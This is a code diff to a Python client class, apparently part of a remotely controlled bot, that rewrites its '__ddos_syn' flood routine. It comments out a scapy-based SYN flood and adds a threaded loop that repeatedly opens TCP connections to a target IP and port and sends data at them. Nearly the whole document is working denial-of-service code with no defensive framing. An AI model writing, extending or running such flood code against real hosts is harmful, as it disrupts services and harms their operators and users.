@@ -58,17 +58,26 @@ class Client():
         self.run=False
     def __ddos_syn(self,*args):
         def dos(*args):
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            local_ip = s.connect(("8.8.8.8", 80))
-            destination_IP = args[1]
-            destination_port = int(args[2])
+            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            #local_ip = s.connect(("8.8.8.8", 80))
+            #destination_IP = args[1]
+            #destination_port = int(args[2])
+            #i = 1
+            #while self.run:
+                #if not self.run:break
+                #send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,
+                     #inter=0.0000001)
+                #print("Packet sent: ", i)
+                #i = i + 1
+            BUFFER_SIZE = 1024
+            BUFFER_SIZE = bytes(BUFFER_SIZE)
             i = 1
             while self.run:
-                if not self.run:break
-                send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,
-                     inter=0.0000001)
-                print("Packet sent: ", i)
-                i = i + 1
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((args[1], int(args[2])))
+                s.sendto(BUFFER_SIZE, (args[1], int(args[2])))
+                print ("Sent Packet: ", i)
+                i=i+1
         Thread(target=dos, args=[*args]).start()
 
     def _recv(self):
